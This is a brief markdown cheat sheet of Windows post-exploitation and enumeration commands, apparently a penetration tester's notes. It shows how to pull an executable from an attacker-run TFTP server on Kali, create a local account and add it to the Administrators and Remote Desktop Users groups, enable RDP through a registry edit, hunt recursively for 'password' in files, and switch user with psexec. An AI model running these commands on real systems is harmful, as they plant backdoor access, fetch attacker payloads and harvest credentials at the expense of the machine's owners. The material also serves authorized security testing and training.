# Random Useful Windows Commands and Enum Stuff
### Install TFTP (Windows 7, Windows Vista, Windows Server 2008/2008 R2)
pkgmgr /iu:"TFTP"

C:\>tftp -i IPADDRESS get FILE.EXE
	
Make sure it is set up/running on Kali

mkdir /tftp

atftpd --daemon --port 69 /tftp

cp /FILE.EXE /tftp/


### Add a local user account
net user tester testing /ADD

### Add a local user account to the Local Administrators group
net localgroup administrators tester /ADD

### Add a local user account to the Remote Desktop Users group
net localgroup "Remote Desktop Users" tester /ADD

### Enable RDP on the system (port 3389)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

### Search for a file
C:\> dir filename.txt /s

### Search for a string in all files
findstr /S /I /M password c: \*

  Go crazy:   findstr /si password *.txt | *.xml | *.ini | *.doc | *.snt | *.html | *.rtf | *.docx | *.eml | *.msg
	  
	  More info on options: https://en.wikipedia.org/wiki/Findstr

### Windows System Version
systeminfo | findstr /B /C: "OS Name" /C:"OS Version"

systeminfo

ver

### Services
tasklist /v

### Switch user with psexec/psexec64 (useful if you have admin creds)

psexec64 -accepteula

psexec64 -u username cmd.exe


### Directory Traversal
Windows/system32/Eula.txt -- May show exact version of Windows running including Language (on older systems)
